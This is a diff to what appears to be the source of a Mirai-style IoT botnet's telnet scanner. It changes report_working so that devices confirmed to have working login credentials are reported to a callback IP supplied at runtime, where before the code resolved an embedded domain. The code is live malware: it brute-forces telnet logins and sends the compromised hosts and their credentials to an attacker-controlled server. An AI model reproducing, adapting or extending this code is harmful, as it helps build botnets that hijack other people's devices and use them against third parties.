@@ -54,7 +54,7 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
-void scanner_init(char* ipAddress)
+void scanner_init(char* localIpAddress, char* callbackIpAddress)
 {
     int i;
     uint16_t source_port;
@@ -66,7 +66,7 @@ void scanner_init(char* ipAddress)
     if (scanner_pid > 0 || scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr(ipAddress);
+    LOCAL_ADDR = util_local_addr(localIpAddress);
 
     rand_init();
     fake_time = time(NULL);
@@ -617,7 +617,7 @@ void scanner_init(char* ipAddress)
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                report_working(conn->dst_addr, conn->dst_port, conn->auth, callbackIpAddress);
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
@@ -920,7 +920,7 @@ static struct scanner_auth *random_auth_entry(void)
     return NULL;
 }
 
-static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
+static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth, char* callbackIpAddress)
 {
     struct sockaddr_in addr;
     int pid = fork(), fd;
@@ -937,23 +937,32 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
-    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
+//    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
     table_unlock_val(TABLE_SCAN_CB_PORT);
 
-    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
-    if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[report] Failed to resolve report address\n");
-#endif
-        return;
-    }
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
-    resolv_entries_free(entries);
+//    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
+//    if (entries == NULL)
+//    {
+//#ifdef DEBUG
+//        printf("[report] Failed to resolve report address\n");
+//#endif
+//        return;
+//    }
 
-    table_lock_val(TABLE_SCAN_CB_DOMAIN);
+    addr.sin_family = AF_INET;
+//    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    addr.sin_addr.s_addr = util_local_addr(callbackIpAddress);
+    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
+//    resolv_entries_free(entries);
+
+#ifdef DEBUG
+    int len=20;
+    char buffer[len];
+    inet_ntop(AF_INET, &(addr.sin_addr.s_addr), buffer, len);
+    printf("[report] Reporting to ip: %s\n", buffer);
+#endif
+
+//    table_lock_val(TABLE_SCAN_CB_DOMAIN);
     table_lock_val(TABLE_SCAN_CB_PORT);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
